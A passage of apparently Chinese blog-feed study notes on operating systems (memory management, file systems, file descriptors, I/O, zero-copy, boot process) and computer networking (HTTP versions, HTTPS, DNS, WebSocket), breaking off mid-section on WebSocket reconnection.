-地址空间与地址类型逻辑地址（虚拟地址）逻辑地址是由程序生成的地址，也叫虚拟地址。在程序中访问内存时，使用的就是逻辑地址。
-物理地址物理地址是真正被映射到内存芯片上的地址，由硬件识别。操作系统通过内存管理单元（MMU）将逻辑地址转换成物理地址。
-地址空间
-逻辑地址空间：进程能看到的内存范围。
-物理地址空间：实际硬件可用的内存范围。
-
-每个进程有独立的逻辑地址空间，操作系统通过地址转换机制将其映射到共享的物理内存上。
-
-分段（Segmentation）分段是一种将逻辑地址空间划分为多个“逻辑单元”的方法，比如代码段、数据段、堆、栈等。
-
-每段具有独立的基址和长度。
-程序更容易实现模块化管理。
-缺点是段长不固定，容易产生外部碎片。
-
-分段常用于早期操作系统或嵌入式系统，在现代系统中通常结合分页一起使用。
-
-
-分页（Paging）分页是将物理内存和逻辑内存都划分成等大小的固定块，分别叫做：
-
-页（Page）：逻辑内存单位
-帧（Frame）：物理内存单位
-
-操作系统维护一个页表（Page Table），用于将每个页映射到对应的帧，解决了分段带来的外部碎片问题。
-
-每个进程都有自己的页表
-地址转换过程由 MMU 自动完成
-
-地址转换过程逻辑地址 &#x3D; 页号 + 页内偏移查页表得到帧号，组合成物理地址。
-
-虚拟内存（Virtual Memory）虚拟内存是操作系统通过分页机制提供的一种内存扩展技术。即使物理内存不足，也可以通过将部分内存页暂存到磁盘（称为交换空间或 Swap）来继续执行程序。
-
-提供了比实际物理内存更大的地址空间
-支持按需调页，程序启动时不需要全部加载到内存
-支持内存共享和内存保护机制
-
-
-页面置换算法当内存不足，必须将一部分内存页换出磁盘，空出空间加载新页，这称为页面置换。操作系统使用页面置换算法来决定“淘汰哪一页”。
-常见算法包括：
-FIFO（先进先出）最早进入内存的页最先被换出，简单但效率不佳，容易出现 Belady 异常（缓存更大反而更差）。
-LRU（最近最少使用）淘汰最近最少使用的页，基于访问历史，命中率高，但实现复杂，通常需要硬件支持或近似算法。
-Clock（时钟算法）一种 LRU 的近似实现，使用一个“指针”遍历页表，查看是否被访问过，没访问的就换出。
-
-内存分配策略操作系统在分配内存块时，也使用了不同的策略：
-
-首次适配（First Fit）：从头开始找第一个够用的空闲块
-最佳适配（Best Fit）：找最接近所需大小的空闲块，减少碎片
-最差适配（Worst Fit）：找最大的空闲块，预留更多剩余空间
-
-这些策略都面临一个问题：内存碎片，包括：
-
-外部碎片：空闲块分布零散，总空间够但连续不够
-内部碎片：分配的块比实际需求大，造成浪费
-
-分页能很好地解决这两个问题，但会带来页表维护开销。
-
-多级页表与快表（TLB）在分页系统中，页表过大时会引起访问效率下降。为了解决这个问题，操作系统引入了：
-
-多级页表：将页表本身分页，分层管理，节省内存空间
-TLB（Translation Lookaside Buffer）：一种缓存页表项的高速缓冲区，提升地址转换速度
-
-如果页表命中 TLB，地址转换非常快；如果未命中，就需要多次内存访问。
-
-内存保护与共享现代操作系统通过 MMU 提供内存保护机制：
-
-每个进程只能访问自己的地址空间
-通过设置页表项中的访问权限，实现读写保护
-共享内存（如动态链接库）可以被多个进程映射到相同的物理帧上，提升内存利用率
-
-
-典型案例：Linux 内存结构在 Linux 中，每个进程的虚拟地址空间大致如下：
-高地址---------------------内核空间---------------------用户堆栈（Stack）共享库（.so）堆（Heap）未初始化数据段（.bss）初始化数据段（.data）代码段（.text）---------------------低地址
-
-堆向上增长，栈向下增长，这样可以更好地利用地址空间。
-
-文件系统文件系统的作用文件系统是操作系统中负责管理和存储数据的子系统，其核心目标是为用户提供一种抽象、统一、安全、高效的数据访问方式。
-通过文件系统，用户可以方便地创建、读取、修改、删除文件和目录，而无需关心底层磁盘的组织方式。
-
-文件的逻辑结构从操作系统角度看，文件是逻辑上的字节序列，可以是文本、图片、程序、数据库文件等。文件通常包括以下信息：
-
-文件数据：实际内容
-元数据（Metadata）：描述文件的属性，如文件名、大小、创建时间、权限等
-
-
-文件目录组织为了便于管理大量文件，操作系统使用目录结构进行层级分类。常见目录结构包括：
-单层目录结构所有文件存储在一个目录下，简单但混乱，不适合多用户系统。
-二级目录结构每个用户一个独立目录，解决了命名冲突，但目录层级仍然不够丰富。
-树形目录结构（现代系统通用）支持多层嵌套子目录，灵活且可扩展。路径分为：
-
-绝对路径：从根目录 / 开始，如 /home/user/docs
-相对路径：基于当前目录，如 ../images
-
-
-inode（索引节点）Linux 等类 Unix 系统中，每个文件都有一个唯一的索引节点（inode），用于记录文件的元数据和磁盘位置。
-inode 包含以下信息：
-
-文件类型（普通文件、目录、符号链接等）
-文件权限（rwx）
-所有者 UID、组 GID
-创建、访问、修改时间
-文件大小
-指向数据块的指针
-
-文件名和 inode 是分离的。多个文件名可以指向同一个 inode（硬链接）。
-
-文件的访问权限Unix 系统使用三类用户 + 三种权限的模型：
-
-用户类型：
-所有者（User）
-所在组（Group）
-其他用户（Others）
-
-
-权限类型：
-读（r）：查看文件内容或目录列表
-写（w）：修改文件内容或目录结构
-执行（x）：运行文件或进入目录
-
-
-
-例如权限串 -rw-r--r-- 表示一个普通文件，拥有者可读写，组和其他用户只读。
-
-磁盘空间的分配方式文件的数据被存储在磁盘块（block）中，磁盘块的分配方式会影响读写性能和碎片率：
-连续分配文件占用连续的磁盘块，读写性能高，但不利于文件扩展，容易产生外部碎片。
-链式分配每个磁盘块中记录下一个块的地址，文件可任意扩展，但随机访问性能差。
-索引分配每个文件有一个索引块，记录所有数据块的地址，灵活且易于管理，是现代文件系统的主流方式。
-
-常见文件系统类型FAT（File Allocation Table）
-早期 Windows 使用，简单但易碎片化
-无权限管理机制，适合 U 盘、存储卡等移动设备
-
-NTFS（Windows 默认）
-支持权限控制、日志、压缩、加密等特性
-稳定性和扩展性好，适用于大型存储系统
-
-ext 系列（Linux）
-ext3：支持日志机制
-ext4：支持大文件、文件系统检查更快，广泛应用于 Linux 发行版
-
-XFS、ZFS、Btrfs 等
-更现代的文件系统，支持快照、复制、自动修复等高级特性，适用于云计算和企业环境
-
-
-缓存与写入机制操作系统并不会每次写入都直接同步到磁盘，而是使用缓存机制提升性能：
-
-页缓存（Page Cache）：内存中保存文件内容
-写回机制（Write-back）：延迟写入，提高效率
-写通机制（Write-through）：写操作同步写入磁盘，更安全但性能差
-
-可以使用 fsync() 或 sync 命令强制刷新缓存。
-
-符号链接与硬链接硬链接（Hard Link）
-多个文件名指向同一个 inode
-删除任意一个不会影响其他链接
-不能跨文件系统或对目录使用
-
-符号链接（Symbolic Link）
-类似快捷方式，指向目标文件路径
-本质是一个独立文件
-可以跨文件系统使用
-
-
-文件系统的挂载与卸载在 Unix&#x2F;Linux 中，所有设备上的文件系统都被“挂载”到主目录树上。
-
-使用 mount 命令将设备挂载到某个目录
-使用 umount 卸载
-/etc/fstab 可配置开机自动挂载项
-
-挂载是将不同存储介质的内容统一整合到单一的目录结构中。
-
-文件描述符文件描述符（File Descriptor，FD） 是一个相对抽象的概念，但它在操作系统（尤其是 Linux&#x2F;Unix 系统）中起着至关重要的作用。简而言之，文件描述符是一个整数，用于标识一个打开的文件或 I&#x2F;O 资源（如套接字、管道等）。
-文件描述符的基本概念在 Linux&#x2F;Unix 系统中，当一个进程打开一个文件或设备时，操作系统会分配一个文件描述符来引用该文件或设备。进程通过文件描述符与文件或设备进行交互，而不是直接操作文件名或设备。
-可以将文件描述符看作是一个“索引”，它指向操作系统内核中的一个数据结构，该数据结构描述了打开文件的相关信息，如文件的位置、文件的读写权限、文件的类型等。
-文件描述符的范围
-标准输入（stdin）：文件描述符 0
-标准输出（stdout）：文件描述符 1
-标准错误（stderr）：文件描述符 2
-
-这些是系统启动时就自动打开的文件描述符，通常用来处理命令行输入输出。
-对于用户程序打开的文件或设备，操作系统会从 3 开始分配文件描述符。每打开一个文件或 I&#x2F;O 资源，操作系统会返回一个新的文件描述符。
-文件描述符与文件操作文件描述符是进程与文件、套接字等 I&#x2F;O 资源进行交互的 接口。通过文件描述符，进程可以执行各种操作，如读取、写入、关闭等。
-示例
-打开文件：
-
-int fd = open(&quot;file.txt&quot;, O_RDONLY);
-
-这里，open() 系统调用返回一个文件描述符 fd，它代表了 &quot;file.txt&quot; 这个文件。
-
-读写文件：
-
-char buffer[100];int bytes_read = read(fd, buffer, 100);
-
-read() 系统调用使用文件描述符 fd 来读取文件内容。
-
-关闭文件：
-
-close(fd);
-
-close() 系统调用用来关闭文件描述符 fd，释放内核资源。
-文件描述符的底层实现操作系统内部使用文件描述符来管理文件。每个文件描述符对应一个 文件表项（file table entry），它包含了以下信息：
-
-文件的偏移量（即文件指针的位置）
-文件的访问权限
-当前打开的文件的状态（如是否已打开）
-
-这些信息存在于操作系统内核的内存中。当进程使用文件描述符进行操作时，内核会根据该描述符查找对应的文件表项，从而完成对文件的读写、关闭等操作。
-文件描述符的用途文件描述符不仅仅用于文件，还用于其他类型的 I&#x2F;O 资源，如：
-
-网络套接字（Socket）：用于处理网络通信。
-管道（Pipe）：用于进程间通信（IPC）。
-设备文件：如 /dev/null、/dev/sda 等，表示硬件设备。
-
-因此，文件描述符是操作系统实现 I&#x2F;O 操作的一个 抽象接口，它使得程序可以通过统一的方式访问不同的资源。
-示例：标准输入输出的使用在 C 语言中，你可以通过文件描述符直接进行标准输入输出操作：
-#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main() &#123;    char buf[100];    int bytes_read = read(0, buf, sizeof(buf));  // 从标准输入读取数据，文件描述符 0 是标准输入    write(1, buf, bytes_read);  // 向标准输出写入数据，文件描述符 1 是标准输出    return 0;&#125;
-
-在这个例子中，0 和 1 就是标准输入和标准输出的文件描述符，read() 和 write() 系统调用通过这些文件描述符与 I&#x2F;O 设备交互。
-
-总结
-文件描述符 是操作系统分配给进程的整数，用于表示已打开的文件、套接字、管道等 I&#x2F;O 资源。
-它是进程与外部资源进行交互的 抽象接口，允许操作系统统一管理所有类型的 I&#x2F;O 操作。
-文件描述符通常从 3 开始，标准输入、标准输出、标准错误分别是 0、1、2。
-通过文件描述符，程序可以执行如读取、写入、关闭等操作，而无需直接处理底层的设备细节。
-
-虽然文件描述符的概念抽象，但它是操作系统中 I&#x2F;O 操作的基础，理解它有助于更好地掌握系统资源的管理。
-
-设备管理与I&#x2F;O系统设备管理的目标操作系统中的设备管理负责协调各种输入输出设备的访问和调度，包括磁盘、键盘、显示器、网卡、打印机等。
-主要目标包括：
-
-统一接口：为应用程序屏蔽硬件差异
-资源共享：协调多个进程访问同一设备
-并发控制：避免冲突和竞争
-性能优化：提升设备利用率和响应速度
-
-
-设备的分类按功能和控制方式，设备可以分为以下几类：
-按功能划分
-块设备（Block Devices）：以固定大小块为单位读写，如硬盘、SSD、光驱
-字符设备（Character Devices）：按字节流方式读写，如串口、键盘、鼠标
-网络设备（Network Devices）：进行数据包发送和接收，如网卡
-
-按访问方式划分
-随机访问设备：如磁盘，支持跳转到任意位置读写
-顺序访问设备：如磁带，必须按顺序读取
-
-
-驱动程序的作用设备驱动程序是设备和操作系统之间的“翻译官”，将统一的系统调用接口转换成设备控制指令。
-驱动程序通常以模块形式加载到内核中，具备以下特性：
-
-面向特定硬件编写，强依赖设备细节
-提供初始化、读写、中断处理等功能
-支持热插拔、错误恢复、功耗管理等高级功能
-
-现代操作系统使用 **设备树（Device Tree）**或 ACPI 表进行设备发现和初始化。
-
-I&#x2F;O 操作的基本流程一次典型的 I&#x2F;O 操作大致流程如下：
-
-用户调用标准库函数（如 read()、write()）
-操作系统发出系统调用，进入内核
-驱动程序控制设备开始传输
-设备完成操作后发送中断信号
-操作系统唤醒等待进程，返回数据
-
-
-I&#x2F;O 模型操作系统提供多种 I&#x2F;O 模型，用于平衡“等待时间”和“并发能力”。
-阻塞 I&#x2F;O调用方发出 I&#x2F;O 请求后，阻塞等待数据返回，适合简单场景，但性能不高。
-非阻塞 I&#x2F;O立即返回，如果没有数据可读，则返回错误码。适合轮询模型。
-多路复用 I&#x2F;O（select&#x2F;poll&#x2F;epoll）单个线程监控多个 I&#x2F;O 事件，适合高并发网络服务器。
-
-select：支持有限文件描述符，性能一般
-poll：不限数量，但每次都要遍历
-epoll：事件驱动机制，性能优越（Linux 特有）
-
-异步 I&#x2F;O（AIO）I&#x2F;O 调用立即返回，操作系统后台完成数据传输后通知用户程序，真正意义上的“非阻塞”。
-
-实现复杂，但极大减少线程上下文切换
-在高性能服务器和数据库中常见
-
-
-中断机制与 DMA中断机制设备完成操作后，通过发送中断请求（IRQ）通知 CPU，无需程序主动等待。
-
-硬件中断：设备主动发起
-软件中断：程序触发，如 int 0x80 系统调用
-
-中断处理程序运行在内核态，必须快速响应并尽快返回。
-DMA（Direct Memory Access）DMA 控制器允许设备绕过 CPU 直接访问内存，极大提高 I&#x2F;O 效率。
-
-典型应用：磁盘读写、大规模数据传输
-CPU 只需发出命令，数据搬运由 DMA 完成
-
-
-缓冲区与缓存机制I&#x2F;O 操作通常通过缓冲区实现数据的批量传输，减少频繁调用和上下文切换：
-
-用户缓冲区：由应用程序分配，如读取文件时的 buffer
-内核缓冲区：系统内部缓存区，如页缓存、IO 缓冲
-
-Linux 提供如下几种常见缓存机制：
-
-页缓存（Page Cache）：文件内容缓存，提高读写性能
-目录项缓存（dentry cache）：目录路径缓存，提升文件系统效率
-inode 缓存：保存文件 inode 信息，避免重复读盘
-
-
-I&#x2F;O 调度算法当多个进程同时请求磁盘 I&#x2F;O 时，操作系统通过调度算法优化执行顺序：
-
-FCFS（先来先服务）：简单但效率低
-SSTF（最短寻道时间优先）：优先处理距离当前磁头最近的请求
-SCAN（电梯算法）：磁头像电梯一样来回移动处理请求
-CFQ（完全公平队列）：为每个进程分配时间片，保持公平性（Linux 默认）
-
-
-设备文件与 &#x2F;dev 目录Linux 中设备被抽象为文件，统一存储在 /dev 目录中。
-
-每个设备文件对应一个驱动和设备实例
-使用主设备号（major）标识驱动程序
-使用次设备号（minor）标识设备编号
-
-例如：
-/dev/sda      # 第一块磁盘/dev/tty0     # 第一个终端/dev/null     # 空设备，丢弃写入数据
-
-
-零拷贝零拷贝 指的是在数据传输过程中，尽量避免 CPU 进行多次内存拷贝操作，从而提升 I&#x2F;O 性能，降低 CPU 负载，尤其适用于高性能网络服务和大文件传输场景。
-传统的数据传输方式在用户态和内核态之间涉及多次数据复制，而零拷贝通过各种机制尽量避免这些不必要的拷贝。
-
-传统 I&#x2F;O 的拷贝过程（以发送文件为例）以一个应用程序发送文件数据到网络为例，传统流程大概如下：
-
-磁盘上的文件内容通过 DMA 拷贝到内核缓冲区（Page Cache）
-操作系统通过 read() 将数据从内核缓冲区拷贝到用户缓冲区（用户态）
-应用程序调用 send()，再把用户缓冲区数据拷贝回内核的 socket 缓冲区
-最后，数据通过网卡 DMA 发送出去
-
-这整个过程涉及两次用户态和内核态之间的内存拷贝，非常耗费 CPU 和内存带宽。
-
-零拷贝是怎么做的为了优化这类过程，现代操作系统（尤其是 Linux）支持一系列“零拷贝”技术主要思想是消除用户态和内核态之间的数据拷贝，从本质上说，零拷贝的优化目标是：
-
-避免用户态 ↔ 内核态的数据拷贝
-利用 DMA（Direct Memory Access）进行磁盘或网卡直接读写
-重用页缓存或内存映射等机制，减少数据搬运
-
-常见方式有：
-sendfile() 系统调用这是 Linux 最常用的零拷贝接口，专门用来将一个文件“直接发送”到网络套接字。
-sendfile(out_fd, in_fd, NULL, len);
-
-
-内核内部直接将磁盘数据从 Page Cache 映射到 socket 缓冲区
-避免用户态中间缓冲，完全不经过用户空间
-
-实现中仍可能使用 DMA 和 page remapping 等方式来减少复制次数。
-mmap() + write()
-使用 mmap() 将文件直接映射到进程地址空间
-不显式复制数据，直接通过地址映射访问数据
-可用于共享内存或文件映射，也算是一种“用户空间零拷贝”
-
-不过这种方式仍可能涉及写入时的额外 copy，不如 sendfile() 更彻底。
-splice() &#x2F; tee() &#x2F; vmsplice()这是 Linux 提供的更底层的零拷贝接口，用于在文件描述符之间转移数据：
-
-splice()：把数据从一个文件描述符“管道”到另一个，不经用户态
-tee()：复制管道内容，不拷贝数据
-vmsplice()：把用户缓冲区直接插入到管道中
-
-这类接口配合管道&#x2F;套接字使用，可以实现极高性能的数据搬运（比如视频转发服务器）。
-
-系统启动流程与内核机制系统启动的整体流程概览从按下电源按钮开始，到桌面或命令行界面出现，操作系统经历了以下关键阶段：
-
-固件初始化（BIOS 或 UEFI）
-引导加载器（Bootloader）启动
-内核加载与初始化
-用户空间初始化（init 系统）
-系统服务启动，进入用户交互界面
-
-
-固件初始化（BIOS &#x2F; UEFI）当电源接通后，主板上的 BIOS（老式）或 UEFI（现代）固件首先运行。
-
-负责进行 POST（Power-On Self Test），检查内存、CPU、硬盘等是否正常
-枚举设备，构建硬件环境信息
-查找并加载引导设备（硬盘、U 盘等）上的引导加载器程序
-
-UEFI 是 BIOS 的升级版，支持图形界面、GPT 分区、网络引导等高级功能。
-
-引导加载器（Bootloader）引导加载器是磁盘上最先运行的操作系统组件，负责将内核加载到内存中，并交出控制权。
-常见引导程序包括：
-
-GRUB（GRand Unified Bootloader）：最常用的 Linux 启动器
-LILO：早期的引导程序，已逐步被淘汰
-Windows Boot Manager：Windows 系统的启动器
-
-GRUB 的典型工作流程：
-
-加载自身（位于磁盘 MBR 或 EFI 分区）
-显示操作系统菜单（多系统引导）
-加载内核镜像（如 /boot/vmlinuz）到内存
-加载 initrd&#x2F;initramfs 初始内存盘
-跳转到内核入口地址开始执行
-
-
-内核初始化内核接手之后，开始执行一系列底层初始化动作：
-
-检测和初始化 CPU、内存、I&#x2F;O 设备
-建立中断向量表、内核页表、内存管理结构
-启动内核线程，如 kthreadd、ksoftirqd、kworker 等
-挂载根文件系统（从 initramfs 解压或磁盘中挂载 /）
-执行第一个用户态进程：/sbin/init（或 systemd）
-
-这一步之后，内核正式进入“运行态”，并开始管理整个系统。
-
-用户空间初始化（init 进程）init 进程是用户空间的第一个进程，其 PID 恒为 1，是所有用户进程的祖先。
-目前主流的 init 系统有：
-
-System V init：早期采用，使用脚本启动服务，串行启动，效率不高
-Upstart：Ubuntu 曾用，事件驱动模型
-systemd：现代 Linux 系统主流，支持并行启动、服务依赖管理、日志记录（journald）等功能
-
-systemd 会根据配置文件：
-
-启动目标单元（target，如 graphical.target）
-启动后台服务（如 network、dbus、sshd）
-启动登录界面（TTY、GDM、LightDM 等）
-
-最终进入用户交互状态。
-
-用户态与内核态切换操作系统运行在两个权限级别：
-
-用户态（User Mode）：应用程序运行的环境，权限受限
-内核态（Kernel Mode）：内核代码运行环境，权限最高
-
-从用户态进入内核态的三种方式：
-
-系统调用（syscall）：如 read()、fork()，用户显式请求操作系统服务
-中断（interrupt）：如硬件设备完成任务后发出的信号
-异常（exception）：如除以 0、访问非法内存等
-
-内核态执行完毕后，必须安全返回用户态，恢复之前的上下文信息。
-
-系统调用机制系统调用是用户程序访问操作系统核心服务的唯一合法入口。
-流程如下：
-
-用户程序调用 C 库函数（如 open()）
-C 库使用 syscall 指令切入内核态
-内核根据调用号（Syscall Number）执行对应的内核服务
-执行完毕后切回用户态，返回结果
-
-Linux 使用软中断（int 0x80）或 sysenter/syscall 指令进行系统调用，效率较高。
-
-内核模块与热插拔机制内核为提高灵活性，将部分功能设计成可加载模块（.ko 文件），如文件系统、设备驱动等。
-
-使用 insmod 加载模块，rmmod 卸载模块
-使用 modprobe 管理依赖关系
-使用 lsmod 查看当前已加载模块
-
-模块机制支持设备热插拔、内核调试和按需加载。
-
-内核日志与调试Linux 提供多种内核日志和调试工具：
-
-dmesg：查看启动日志和驱动信息
-/proc 文件系统：以文件方式提供内核状态信息（如 /proc/cpuinfo）
-strace：跟踪进程的系统调用
-perf：分析性能瓶颈
-gdb + qemu：进行内核级调试
-
-
-]]></content>
-      <tags>
-        <tag>操作系统</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网络</title>
-    <url>/2025/04/16/%E7%BD%91%E7%BB%9C/</url>
-    <content><![CDATA[概述计算机网络是一组通过通信链路互相连接的计算设备，它们之间可以进行数据传输、信息共享与远程控制。现在使用的手机、电脑和服务器之间的所有数据交换，都依赖计算机网络的支持。
-网络不只是“上网”，而是一整套庞大而复杂的通信机制。为了规范这套机制，人们制定了大量的“网络协议”，这些协议就像交通规则，定义了数据如何发送、接收、确认、重传等等。
-整个网络通信体系可以理解为一个“层级架构”，常见的是“五层网络模型”，它从上到下分为：
-
-应用层：你直接接触的网络服务，比如浏览器、微信、QQ 等。
-传输层：保障数据可靠或高效传输的机制，代表协议有 TCP、UDP。
-网络层：负责选择数据传输路径，代表协议是 IP。
-数据链路层：确保在局域网中一跳一跳地正确传送数据。
-物理层：底层的电缆、网卡、电信号等。
-
-有了这种分层结构，网络系统可以更易于开发、维护和理解。
-应用层应用层位于网络模型的最顶层，直接面向使用者。无论是浏览网页、登录社交平台、收发电子邮件，底层传输的数据最终都要通过应用层协议来组织和解析。应用层不关心数据如何传输，它只关心数据怎么表达、如何理解。
-每种网络应用都有对应的应用层协议，用来规定通信双方“说什么”和“怎么说”。就像人与人之间的交流需要语言规范一样，不同应用之间也需要统一协议来协作。
-
-HTTP 协议的基本结构与特性HTTP 是使用最广泛的应用层协议，主要用于浏览器与服务器之间的数据交互。它的特点是无状态、基于文本、灵活可扩展。
-一个标准的 HTTP 请求包含三个部分：
-
-请求行：例如 GET /index.html HTTP/1.1
-请求头：包含 Host、User-Agent、Accept、Cookie 等字段
-请求体：主要出现在 POST 请求中，用于提交数据
-
-HTTP 协议版本的演进也带来了性能的逐步优化：
-
-HTTP&#x2F;1.1 支持持久连接（Keep-Alive），避免每次请求都重新建立连接
-HTTP&#x2F;2 引入多路复用，多个请求可以复用同一个 TCP 连接，避免阻塞
-HTTP&#x2F;3 改用基于 UDP 的 QUIC 协议，减少连接建立时间并增强安全性
-
-
-HTTPS 与加密通信机制HTTPS 本质上是 HTTP 协议在 TLS 加密通道下的运行方式，主要解决通信过程中的信息泄露和篡改问题。
-使用 HTTPS 时，客户端和服务器会先进行一次 TLS 握手，主要流程包括：
-
-客户端发起连接，带上支持的加密算法
-服务器返回数字证书、公钥等信息
-客户端验证证书合法性，生成对称密钥并加密传输
-双方使用对称密钥进行后续通信
-
-
-HTTP 请求复用HTTP 请求复用是指在同一个网络连接中，多个 HTTP 请求和响应可以被顺序发送和接收，而不需要为每个请求建立新的连接。这个机制是为了提高网络传输的效率，减少延迟和提高资源利用率。
-HTTP 的请求复用在不同版本的协议中有不同的实现方式，主要体现在 HTTP&#x2F;1.x 和 HTTP&#x2F;2 的实现上。
-HTTP&#x2F;1.x 的请求复用（有限）在 HTTP&#x2F;1.0 和 HTTP&#x2F;1.1 中，尽管有一定的复用机制，但也有其局限性：
-HTTP&#x2F;1.0（无持久连接）
-在 HTTP&#x2F;1.0 中，每一个请求都需要独立建立一个新的 TCP 连接，之后该连接关闭。这意味着如果一个页面需要多个资源（如图片、CSS、JavaScript 文件等），每个资源都需要一个独立的连接，这会导致连接建立和关闭的开销非常大。
-
-HTTP&#x2F;1.1（支持持久连接）
-持久连接：HTTP&#x2F;1.1 引入了持久连接（Persistent Connection，Connection: keep-alive），允许多个请求和响应复用同一个 TCP 连接，从而避免了为每个请求建立新连接的开销。
-Keep-Alive：通过 Connection: keep-alive 头部，HTTP&#x2F;1.1 允许在一个连接上发送多个请求和接收多个响应，而无需每次都重新建立连接。
-但是，HTTP&#x2F;1.1 的复用也有限制。即使同一个连接上可以发送多个请求，它仍然是按顺序处理的，每次请求都必须等待前一个请求的响应完成（队头阻塞问题：指的是由于一个数据包或请求的延迟，导致同一连接中的后续数据包或请求也必须等待这个延迟的数据包或请求完成，从而造成整体的延迟增加）。这意味着多个请求不能并行地发送。
-
-
-
-HTTP&#x2F;2 的请求复用（更高效）HTTP&#x2F;2 对请求复用进行了显著的改进，特别是在减少延迟和解决 HTTP&#x2F;1.x 中的“队头阻塞”问题方面。
-多路复用（Multiplexing）
-多路复用是 HTTP&#x2F;2 的核心特性之一。HTTP&#x2F;2 允许多个请求和响应在同一个连接上 并行 发送，而不会互相阻塞。不同的请求和响应通过 流（stream） 来区分，每个流有一个唯一的标识符。这样，多个请求和响应可以同时在同一个连接上发送和接收，而不必等待前一个请求的完成。
-流（Stream）：HTTP&#x2F;2 中的流是一条双向的数据通道，允许请求和响应并行进行。每个流可以独立传输数据，并且流之间是互相独立的，不会因为一个流的延迟而影响其他流的传输。
-头部压缩：HTTP&#x2F;2 使用 HPACK 头部压缩机制，减少了重复的头部信息，从而节省带宽和提高传输效率。
-优先级和流控制：HTTP&#x2F;2 允许客户端和服务器为不同的请求分配优先级，以便合理利用带宽和资源。
-
-
-
-减少延迟
-在 HTTP&#x2F;2 中，客户端可以在同一个连接中同时发送多个请求，不需要等待每个请求的响应。这意味着对于加载多个资源（如图片、CSS、JavaScript 文件等）时，所有的请求可以并行地发送，显著减少了加载时间。
-请求复用 解决了 HTTP&#x2F;1.x 中的队头阻塞问题，即使是同一个连接上的多个请求，它们也能够并行传输，从而大幅提高了性能。
-
-头部压缩
-HTTP&#x2F;2 使用 HPACK 压缩算法来压缩 HTTP 请求和响应的头部信息，减少了传输的数据量，进一步提高了效率。
-
-HTTP&#x2F;3 的请求复用（基于 QUIC）HTTP&#x2F;3 是基于 QUIC 协议的，它进一步改进了请求复用，并解决了网络中断时的恢复问题。
-QUIC 和 HTTP&#x2F;3
-HTTP&#x2F;3 基于 QUIC（Quick UDP Internet Connections）协议，QUIC 是一个基于 UDP 的协议，旨在降低延迟并提高可靠性。QUIC 本身具有多路复用的能力，允许多个请求和响应并行处理。
-由于 QUIC 设计时就考虑到了减少连接建立时间，它比基于 TCP 的 HTTP&#x2F;2 更加高效，尤其是在网络不稳定或需要频繁切换网络的情况下。
-QUIC 通过 0-RTT 连接恢复，减少了建立连接的时间，从而进一步降低了延迟。
-
-请求复用
-在 HTTP&#x2F;3 中，多个请求和响应仍然能够在一个连接中并行地进行，并且不受 TCP 的限制（如队头阻塞）。QUIC 本身在多个数据流上进行多路复用，支持更高效的并发传输。
-
-总结
-HTTP&#x2F;1.1 提供了持久连接的功能，允许在同一个 TCP 连接上复用多个请求，但由于“队头阻塞”问题，它的复用效率有限。
-HTTP&#x2F;2 引入了 多路复用，允许多个请求和响应并行地在同一个连接上进行传输，显著提高了效率并减少了延迟。
-HTTP&#x2F;3 在 HTTP&#x2F;2 的基础上使用了 QUIC 协议，进一步优化了请求复用，特别是在减少连接建立时间和提高传输效率方面。
-
-因此，HTTP&#x2F;2 和 HTTP&#x2F;3 提供了更加高效的请求复用机制，相比于 HTTP&#x2F;1.x，它们在多个资源并行加载和减少延迟方面表现更优。
-
-DNS 协议与域名解析过程DNS 是将域名解析为 IP 地址的协议，是一切网络访问的起点。比如在浏览器中输入 www.example.com，系统会首先发起一次 DNS 查询。
-DNS 查询过程可能包括：
-
-本地 DNS 缓存查找
-向本地域名服务器发起递归查询
-逐层向根域名服务器、顶级域名服务器、权威服务器发起迭代查询
-获取到 IP 地址后，将结果缓存一段时间
-
-
-WebSocket 实现双向通信WebSocket 是建立在 HTTP 协议之上的全双工通信协议，适用于需要实时推送的应用场景，比如在线聊天、股票行情、游戏等。
-WebSocket 在建立连接阶段，会通过 HTTP 协议完成一次握手，之后升级为长连接通道，可以实现客户端与服务端之间的持续通信。
-它的优势在于：
-
-减少 HTTP 的频繁握手开销
-支持低延迟、持续推送
-客户端和服务器都可以主动发送消息
-
-常见问题包括：与轮询、长轮询的区别、心跳机制的实现方式、如何处理断线重连等。
-Websocket 轮询、长轮询轮询（Polling）
-定义：轮询是一种定时向服务器发送请求，查询数据是否有更新的方式。
-工作原理：
-客户端定时发送HTTP请求到服务器，询问是否有新的数据或事件。
-服务器处理请求并返回结果，客户端再根据返回的数据更新页面。
-
-
-特点：
-每隔一定时间（例如每秒）发送HTTP请求到服务器，即便没有新数据，服务器也会返回一个空的响应。
-消耗带宽：即使没有新数据，轮询也会带来不必要的请求和响应负载。
-延迟较高：因为请求是定期发起的，所以客户端无法获得即时更新。
-
-
-
-长轮询（Long Polling）
-定义：长轮询是轮询的改进版，客户端发送请求到服务器，直到服务器有新数据时才响应。
-工作原理：
-客户端向服务器发送一个HTTP请求，服务器如果有新数据，则立即返回响应；如果没有新数据，服务器会保持连接，直到有数据时再返回响应。
-客户端接收到响应后，再次发起新的请求，继续等待服务器的更新。
-
-
-特点：
-更低的带宽消耗：相较于轮询，长轮询只有在有新数据时才返回响应。
-相较于传统轮询，长轮询的延迟较低，因为它减少了不必要的请求。
-仍然是单向的：尽管是保持连接，客户端和服务器之间的通信仍然是单向的，服务器只能响应客户端的请求。
-
-
-
-WebSocket 心跳机制的实现方式心跳机制（Heartbeat）是为了保持 WebSocket 连接的有效性，防止连接因空闲超时被中间设备（如防火墙、代理服务器）关闭。它还可以帮助客户端检测服务器是否正常运行。
-实现方式：
-客户端发起心跳：
-客户端定期向服务器发送简单的 ping 请求，例如每隔一定的时间（如 30 秒或 1 分钟），客户端发送一个空的数据包，服务器收到后返回 pong。
-如果客户端在超时之前没有收到响应，说明连接可能已断开，客户端可以尝试重新连接。
-
-
-服务器发起心跳：
-服务器可以定期向客户端发送 ping 请求，客户端收到后返回 pong 响应。
-如果客户端在一定时间内没有返回 pong，服务器可以主动关闭连接或重新连接。
-
-
-使用 WebSocket 扩展：
-一些库或框架会实现 WebSocket 扩展，自动进行心跳机制的管理，确保连接的稳定性。
-
-
-心跳消息格式：
-通常心跳消息内容为空，例如：ping 和 pong，这并不涉及任何实际的数据传输，仅仅是连接活跃的信号。
-
-
-
-WebSocket 断线重连处理断线重连是保证 WebSocket 连接在网络异常或服务器断开连接的情况下能够自动恢复连接的机制。
-
-客户端检测连接状态：
-客户端需要监听 WebSocket 的 onclose 事件，检测到连接断开后，触发重连逻辑。
-客户端可以设置一个 重连延迟，逐步延迟重连尝试，避免因过于频繁的重连请求造成额外的负载。
-
-
